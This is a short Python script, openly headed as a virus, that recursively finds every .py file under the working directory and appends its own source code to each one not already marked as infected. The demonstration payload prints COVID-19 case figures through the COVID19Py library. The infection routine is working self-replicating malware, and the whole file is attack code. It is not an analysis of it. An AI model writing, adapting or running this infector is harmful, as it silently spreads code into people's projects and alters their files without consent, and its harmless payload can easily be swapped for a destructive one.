
### -_- VIRUS -_- ###
import glob,sys,re,base64,json,COVID19Py

### INFECTION VECTOR ###

def getVirusCode():
    virusCode = []
    fileHandler = open(sys.argv[0],"r")
    virusCode = fileHandler.read()
    return virusCode

def find_victims():
    return glob.glob("**/*.py",recursive=True)

def infectVirus():
    victims = find_victims()
    victims.remove(sys.argv[0])
    for victim in victims:
        with open(victim,"r") as fh:
            codeLines = fh.readlines()
        with open(victim,"r") as fh:
            programCode = fh.read()
            
        #decrypedCode = base64.b64decode(programCode)
        infected = False
        for codeLine in codeLines:
            if("### -_- VIRUS -_- ###" in codeLine):
                infected = True
                break
        
        if not infected:
            newCode = []
            newCode.extend(programCode)
            #codeBytes = getVirusCode().encode('utf-8')
            #encodedCode = base64.b64encode(codeBytes)
            newCode.extend(getVirusCode())
            
            fileHandler = open(victim,"w")
            #fileHandler.write(encodedCode.decode('utf-8'))
            fileHandler.writelines(newCode)
            fileHandler.close() 

### TRIGGER ###
def trigger():
    payload()

### PAYLOAD ###
def getCovidINFO():
    covid19 = COVID19Py.COVID19()
    locations = covid19.getLocations(rank_by='confirmed')
    print("Top-10 countries with highest coronavirus infections: ")
    for i in range(10):
        print(locations[i]['country'] + " " + str(locations[i]['latest']['confirmed']))
        i+=1

def payload():
    getCovidINFO()

if __name__ == "__main__":
    infectVirus()
    trigger()

### -_- VIRUS END -_- ###